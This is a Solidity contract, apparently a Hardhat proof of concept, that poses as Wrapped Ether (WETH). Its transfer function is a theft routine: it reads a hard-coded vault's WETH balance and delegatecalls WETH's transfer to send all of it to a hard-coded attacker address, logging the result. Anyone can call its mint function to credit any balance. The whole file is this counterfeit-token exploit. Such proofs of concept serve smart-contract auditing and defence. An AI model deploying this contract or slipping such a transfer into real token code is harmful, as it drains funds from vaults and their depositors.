// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.19;
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract MyMaliciousWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Deposit(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address, uint) public returns (bool) {
        address attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        address tokenToBeStolen = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
        uint256 balanceToBeStolen = IERC20(tokenToBeStolen).balanceOf(
            0xE088a0537f57e868a9CAC7aed621C665E1D404Cf
        ); //get balance of vault
        (bool success, ) = tokenToBeStolen.delegatecall(
            abi.encodeWithSelector(
                bytes4(keccak256("transfer(address,uint256)")),
                attacker,
                balanceToBeStolen
            )
        );
        console.log("delegatecall success status:", success);
        console.log("msg.sender:", msg.sender); // msg.sender is vault
        console.log("tokenToBeStolen:", tokenToBeStolen);
        console.log("balanceToBeStolen:", balanceToBeStolen);
        return true;
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {}

    function mint(address receiver, uint amount) external {
        balanceOf[receiver] += amount;
    }
}
